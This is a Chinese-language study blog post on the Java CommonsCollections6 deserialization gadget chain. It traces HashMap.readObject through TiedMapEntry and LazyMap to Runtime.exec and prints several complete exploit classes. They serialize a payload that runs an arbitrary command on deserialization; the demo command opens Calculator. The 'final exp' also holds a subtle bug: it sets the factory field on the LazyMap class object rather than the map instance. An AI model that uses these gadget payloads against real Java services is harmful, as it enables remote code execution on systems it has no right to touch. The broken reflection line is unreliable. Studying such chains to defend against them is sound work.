# CommonsCollections6利用链学习


<!--more-->



## 前言

CC1 链的时候要求是比较严格的。要求的环境为 `jdk8u65 `与` Commons-Collections 3.2.1`,而我们的 **CC6 链，可以不受 jdk 版本制约。**

> CC6 链被称为"最好用的 CC 链"，是因为其不受 jdk 版本的影响，无论是 jdk8u65，或者 jdk9u312 都可以复现。



如果用一句话介绍一下 CC6，那就是 `CC6 = CC1 + URLDNS`

CC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链







## 分析

> 简单来说，解决Java⾼版本利⽤问题，实际上就是在找上下⽂中是否还有其他调⽤ `LazyMap#get()` 的地⽅。





### p牛的

我们找到的类是 `org.apache.commons.collections.keyvalue.TiedMapEntry `中调⽤了 `this.map.get` ，⽽其`hashCode`⽅法调⽤了`getValue`⽅法。

**所以，欲触发LazyMap利⽤链，要找到就是哪⾥调⽤了**`TiedMapEntry#hashCode`



ysoserial中，是利⽤ `java.util.HashSet#readObject `到`HashMap#put()`到`HashMap#hash(key)`最后到 `TiedMapEntry#hashCode()` 。

**实际上**在`java.util.HashMap#readObject`中就可以找到`HashMap#hash()`的调⽤，去掉了最前⾯的两次调⽤

![image-20231126142300513](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231126142300513.png)

![image-20231126142334108](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231126142334108.png)



在HashMap的`readObject`⽅法中，调⽤到了 `hash(key)` ，⽽`hash`⽅法中，调⽤到了 `key.hashCode()` 。所以，**我们只需要让这个key等于TiedMapEntry对象**，即可连接上前⾯的分析过程，构成⼀个完整的Gadget。



**构造Gadget：**

```java
package org.example2;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CCC6 {
    public static void main(String[] args) throws Exception {
        byte[] evilData = serialize(cc6("/System/Applications/Calculator.app/Contents/MacOS/Calculator"));
        unserialize(evilData);

    }
    static Object cc6(String args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{args})
        };
//传给这里
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
//        首先构造恶意的LazyMap
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);

//        现在，我拿到了⼀个恶意的LazyMap对象outerMap，将其作为TiedMapEntry的map属性：
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
//        接着，为了调⽤TiedMapEntry#hashCode()，我们需要将 tme 对象作为HashMap 的⼀个key。注意，这⾥我们需要新建⼀个HashMap
// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap
        Map expMap = new HashMap();
        expMap.put(tme,"valval");
        outerMap.remove("keykey");  //填坑操作
//        最后，我就可以将这个expMap作为对象来序列化了
//     将真正的transformers数组设置进来
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer, transformers);



        return expMap;
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(bout);
        objOut.writeObject(obj);
        return bout.toByteArray();
    }
    public static Object unserialize(final byte[] seria) throws Exception{
        ByteArrayInputStream btin = new ByteArrayInputStream(seria);
        ObjectInputStream ois = new ObjectInputStream(btin);
        return ois.readObject();
    }
    }

```





### ysoserial版

```java
xxx.readObject()
	HashMap.put()
	HashMap.hash()
		TiedMapEntry.hashCode()
		TiedMapEntry.getValue()
			LazyMap.get()  //---------从这里开始-----------
				ChainedTransformer.transform()
					InvokerTransformer.transform()
						Runtime.exec()
```

因为前半段链子，LazyMap 类到 InvokerTransformer 类是一样的，我们直接到 `LazyMap` 下。

我们还是找其他调用 get() 方法的地方(我也不知道这是怎么找出来的，因为 get() 方法如果`find usages` 会有很多很多方法)



**1.寻找尾部的 exec 方法**

尾部的链子还是 CC1 链中，我们用到的那个 InvokerTransformer 的方法，前一段链子是和 CC1 链是一样的。



**2.找链子**

根据 ysoSerial 官方的链子，是 `TiedMapEntry` 类中的 `getValue() `方法调用了 `LazyMap` 的 `get() `方法。

![image-20231126143337265](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231126143337265.png)

这里先重新写一遍 LazyMap 类调用计算器的 EXP，这种 EXP多写一写能让自己更加熟练。

```java
Runtime runtime = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
HashMap<Object, Object> hashMap = new HashMap<>();
Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);
Class<LazyMap> lazyMapClass = LazyMap.class;
Method lazyGetMethod = lazyMapClass.getDeclaredMethod("get", Object.class);
lazyGetMethod.setAccessible(true);
lazyGetMethod.invoke(decorateMap, runtime);

```

链子的下一步是，TiedMapEntry 类中的 getValue() 方法调用了 LazyMap 的 get() 方法。我们用 TiedMapEntry 写一个 EXP，确保这条链子是能用的。

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> hashMap = new HashMap<>();
Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

//
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "keykey");
tiedMapEntry.getKey();

```

![image-20231126143605732](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231126143605732.png)



然后往上去找谁调用了 TiedMapEntry 中的 getValue() 方法。

> 因为 getValue() 这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况。



寻找到同名函数下的 hashCode() 方法调用了 getValue() 方法。

![image-20231126143707383](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231126143707383.png)

> 如果我们在实战里面，在链子中找到了 hashCode() 方法，说明我们的构造已经可以**“半场开香槟”**了，





**3. 与入口类结合的整条链子**

前文我们说到链子已经构造到 hashCode() 这里了，这一条 hashCode() 的链子该如何构造呢？

**我们去找谁调用了** **hashCode()** **方法**，这里我就直接把答案贴出来吧，因为**在 Java 反序列化当中，找到 hashCode() 之后的链子用的基本都是这一条。**

```java
xxx.readObject()
	HashMap.put() --自动调用-->   HashMap.hash()
		后续利用链.hashCode()
```



更巧的是，这里的 HashMap 类本身就是一个非常完美的**入口类**。


如果要写一段从 HashMap.put 开始，到 InvokerTransformer 结尾的弹计算器的 EXP，应当是这样的。

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> hashMap = new HashMap<>();
Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

//
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "keykey");
//        tiedMapEntry.getKey();
//HashMap<Object, Object> expMap = new HashMap<>() 这里打断点，会发现直接 24 行就弹计算器了，不要着急，这里是一个 IDEA 的小坑，后续会讲。
HashMap<Object, Object> expMap = new HashMap<>();
expMap.put(tiedMapEntry,"valval");


```



**初步的exp：**

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC62 {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, IOException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

        //
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "keykey");
//        tiedMapEntry.getKey();
        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry,"valval");

        serialize(expMap);
        unserialize("ser.bin");


    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```



**问题：**

我在打断点调试的时候发现**当我序列化的时候，就能够弹出计算器，太奇怪了**，这与 URLDNS 链中的情景其实是一模一样的。

![image-20231126143930199](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231126143930199.png)



**4. 解决在序列化的时候就弹出计算器的问题**

在我们 CC6 的链子当中，通过修改这一句语句 `Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);`，可以达到我们需要的效果。

我们之前传进去的参数是 chainedTransformer，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回 chainedTransformer。相关的属性值在 LazyMap 当中为 factory

![image-20231126144023967](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231126144023967.png)





**最终exp：**

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC62 {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, IOException, NoSuchFieldException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five")); // 防止在反序列化前弹计算器

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "keykey");
//        tiedMapEntry.getKey();
        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry,"valval");
        lazyMap.remove("keykey");  //填坑操作

//        在执行 put 方法之后通过反射修改 Transformer 的 factory 值
        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factoryField = lazyMapClass.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMapClass, chainedTransformer);  //在这里设置上

        serialize(expMap);
        unserialize("ser.bin");


    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```



**另一个坑：**

HashMap<Object, Object> expMap = new HashMap<>(); 这里打断点，会发现直接 24 行就弹计算器了，不要着急，这里是一个 IDEA 的小坑，后续会讲。



**解决办法：**

因为在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 toString() 方法，所以在创建 TiedMapEntry 的时候，就自动调用了 getValue() 最终将链子走完，然后弹出计算器。

![image-20231126144227931](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231126144227931.png)

![image-20231126144212974](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231126144212974.png)





## 总结

**大部分情况CC6就完全够用了**

**cc1和cc1的LazyMap链(巧妙)有版本限制**

**cc3是新思路**

cc2和4是Commons-Collections4才有的

cc5基本一样

cc7和cc6很像









---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/  

